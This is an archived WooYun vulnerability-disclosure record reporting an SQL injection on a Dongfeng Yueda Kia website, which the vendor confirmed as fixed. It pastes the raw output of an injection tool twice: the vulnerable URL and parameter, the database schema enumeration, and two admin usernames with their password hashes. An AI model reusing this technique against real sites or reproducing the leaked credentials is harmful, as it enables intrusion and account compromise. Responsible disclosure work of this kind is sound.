{"id": 43822, "wybug_id": "wooyun-2014-081552", "wybug_title": "东风悦达起亚某站点SQL注入", "wybug_corp": "dyk.com.cn", "wybug_author": "CtrlH", "wybug_date": "2014-11-03 11:13", "wybug_open_date": "2014-12-18 11:16", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-18：\t细节向公众公开  简要描述： 今天单位消防知识讲座，消防支队的人说前些日子去救火，一个女的最后关头抱着个电脑冲了出来。消防员很生气问她：你不要命了，钱重要命重要。命都没了要电脑干什么。女人很委屈说自己是公司会计，电脑里很多数据很重要。消防员一听更急了：尼玛有点常识好不好，数据重要你抱主机啊，你TM抱个显示器干啥！ 详细说明：  \n\nURL:http://www.dyk.com.cn/search?q=K3&t=1 q=K3Analyzing http://www.dyk.com.cn/search?q=K3&t=1 q=K3 with 2 input parameter(s)Test parameter: tHost IP: 219.145.171.61Web Server: Microsoft-IIS/6.0Powered-by: ASP.NETPowered-by: PHP/5.3.27Keyword Found: 2014-10-31Injection type is String (')DB Server: MySQL >=5Trying another method using keyword for finding columns countFindig columns count for MySQL failed!Current DB: dyk_dykMySQL error based injection method can be used!Count(table_name) of information_schema.tables where table_schema=0x64796B5F64796B is 32Can not get all tables by group_concat!Count(table_name) of information_schema.tables where table_schema=0x64796B5F64796B is 32Bypassing illegal union failed! Turning off this featureTable found: ci_addonarticleTable found: ci_admin_nodeTable found: ci_admin_roleTable found: ci_captchaTable found: ci_adminTable found: ci_arcattTable found: ci_arctypeTable found: ci_attachmentTable found: ci_arctinyTable found: ci_archivesTable found: ci_cartypeTable found: ci_citysTable found: ci_common_cacheTable found: ci_channeltypeTable found: ci_memberTable found: ci_login_logTable found: ci_logTable found: ci_member_carTable found: ci_member_qqTable found: ci_member_msgTable found: ci_search_keywordTable found: ci_provincesTable found: ci_searchTable found: ci_menuTable found: ci_sendmsg_logTable found: ci_sessionsTable found: ci_stepselectTable found: ci_sys_enumTable found: ci_serviceplanTable found: ci_member_sinaweiboTable found: ci_sysconfigTable found: ci_tableCount(column_name) of information_schema.columns where table_schema=0x64796B5F64796B and table_name=0x63695F6D656D6265725F73696E61776569626F is 8Column found: idColumn found: updatetimeColumn found: sina_idColumn found: nameColumn found: addtimeColumn found: headimgColumn found: uidColumn found: statusCount(column_name) of information_schema.columns where table_schema=0x64796B5F64796B and table_name=0x63695F6164646F6E61727469636C65 is 3Column found: aidColumn found: useripColumn found: bodyCount(column_name) of information_schema.columns where table_schema=0x64796B5F64796B and table_name=0x63695F61646D696E5F6E6F6465 is 8Column found: idColumn found: reidColumn found: typeidColumn found: codeColumn found: sortColumn found: is_checkColumn found: descriptionColumn found: nameCount(column_name) of information_schema.columns where table_schema=0x64796B5F64796B and table_name=0x63695F61646D696E5F726F6C65 is 7Column found: idColumn found: descriptionColumn found: menuidsColumn found: sortColumn found: nameColumn found: nodeidsColumn found: is_checkCount(column_name) of information_schema.columns where table_schema=0x64796B5F64796B and table_name=0x63695F63617074636861 is 4Column found: captcha_idColumn found: captcha_timeColumn found: ip_addressColumn found: wordCount(column_name) of information_schema.columns where table_schema=0x64796B5F64796B and table_name=0x63695F61646D696E is 21Column found: idColumn found: realnameColumn found: emailColumn found: msnColumn found: group_idColumn found: phoneColumn found: qqColumn found: postsColumn found: mobileColumn found: nameColumn found: passColumn found: birthdayColumn found: loginCountColumn found: createTimeColumn found: questionColumn found: lastLoginTimeColumn found: cardidColumn found: lastLoginIpColumn found: modifyTimeColumn found: answerColumn found: stateCount(column_name) of information_schema.columns where table_schema=0x64796B5F64796B and table_name=0x63695F617263617474 is 3Column found: sortidColumn found: attColumn found: attnameCount(*) of dyk_dyk.ci_admin is 2Data Found: name,pass=admin^fd6ae85c115d21c784ac7f3a3d9606a9Data Found: name,pass=dyk_admin^9c3782798090e60c81e5c5cc25c7225c   漏洞证明：  \n\nURL:http://www.dyk.com.cn/search?q=K3&t=1 q=K3Analyzing http://www.dyk.com.cn/search?q=K3&t=1 q=K3 with 2 input parameter(s)Test parameter: tHost IP: 219.145.171.61Web Server: Microsoft-IIS/6.0Powered-by: ASP.NETPowered-by: PHP/5.3.27Keyword Found: 2014-10-31Injection type is String (')DB Server: MySQL >=5Trying another method using keyword for finding columns countFindig columns count for MySQL failed!Current DB: dyk_dykMySQL error based injection method can be used!Count(table_name) of information_schema.tables where table_schema=0x64796B5F64796B is 32Can not get all tables by group_concat!Count(table_name) of information_schema.tables where table_schema=0x64796B5F64796B is 32Bypassing illegal union failed! Turning off this featureTable found: ci_addonarticleTable found: ci_admin_nodeTable found: ci_admin_roleTable found: ci_captchaTable found: ci_adminTable found: ci_arcattTable found: ci_arctypeTable found: ci_attachmentTable found: ci_arctinyTable found: ci_archivesTable found: ci_cartypeTable found: ci_citysTable found: ci_common_cacheTable found: ci_channeltypeTable found: ci_memberTable found: ci_login_logTable found: ci_logTable found: ci_member_carTable found: ci_member_qqTable found: ci_member_msgTable found: ci_search_keywordTable found: ci_provincesTable found: ci_searchTable found: ci_menuTable found: ci_sendmsg_logTable found: ci_sessionsTable found: ci_stepselectTable found: ci_sys_enumTable found: ci_serviceplanTable found: ci_member_sinaweiboTable found: ci_sysconfigTable found: ci_tableCount(column_name) of information_schema.columns where table_schema=0x64796B5F64796B and table_name=0x63695F6D656D6265725F73696E61776569626F is 8Column found: idColumn found: updatetimeColumn found: sina_idColumn found: nameColumn found: addtimeColumn found: headimgColumn found: uidColumn found: statusCount(column_name) of information_schema.columns where table_schema=0x64796B5F64796B and table_name=0x63695F6164646F6E61727469636C65 is 3Column found: aidColumn found: useripColumn found: bodyCount(column_name) of information_schema.columns where table_schema=0x64796B5F64796B and table_name=0x63695F61646D696E5F6E6F6465 is 8Column found: idColumn found: reidColumn found: typeidColumn found: codeColumn found: sortColumn found: is_checkColumn found: descriptionColumn found: nameCount(column_name) of information_schema.columns where table_schema=0x64796B5F64796B and table_name=0x63695F61646D696E5F726F6C65 is 7Column found: idColumn found: descriptionColumn found: menuidsColumn found: sortColumn found: nameColumn found: nodeidsColumn found: is_checkCount(column_name) of information_schema.columns where table_schema=0x64796B5F64796B and table_name=0x63695F63617074636861 is 4Column found: captcha_idColumn found: captcha_timeColumn found: ip_addressColumn found: wordCount(column_name) of information_schema.columns where table_schema=0x64796B5F64796B and table_name=0x63695F61646D696E is 21Column found: idColumn found: realnameColumn found: emailColumn found: msnColumn found: group_idColumn found: phoneColumn found: qqColumn found: postsColumn found: mobileColumn found: nameColumn found: passColumn found: birthdayColumn found: loginCountColumn found: createTimeColumn found: questionColumn found: lastLoginTimeColumn found: cardidColumn found: lastLoginIpColumn found: modifyTimeColumn found: answerColumn found: stateCount(column_name) of information_schema.columns where table_schema=0x64796B5F64796B and table_name=0x63695F617263617474 is 3Column found: sortidColumn found: attColumn found: attnameCount(*) of dyk_dyk.ci_admin is 2Data Found: name,pass=admin^fd6ae85c115d21c784ac7f3a3d9606a9Data Found: name,pass=dyk_admin^9c3782798090e60c81e5c5cc25c7225c   修复方案：     版权声明：转载请注明来源 CtrlH@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-11-07 17:59 厂商回复： 已修复，多谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-07 22:20 |    \t\tCtrlH \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:6        | )\t\t \n  @疯狗   sql注入就2rank?    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}